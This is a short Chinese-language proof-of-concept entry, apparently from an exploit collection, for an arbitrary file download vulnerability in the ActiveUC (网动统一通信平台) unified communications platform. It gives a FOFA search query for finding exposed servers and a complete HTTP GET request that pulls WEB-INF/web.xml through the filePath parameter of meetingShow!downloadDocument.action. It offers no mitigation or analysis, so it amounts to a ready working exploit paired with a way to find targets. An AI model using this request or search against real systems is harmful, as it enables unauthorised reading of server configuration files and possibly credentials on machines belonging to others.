## 网动统一通信平台ActiveUC存在任意文件下载漏洞


## fofa
```
title="网动统一通信平台(Active UC)"
```


## poc
```javascript
GET /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: close
```

![image-20240928185228979](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409281852079.png)
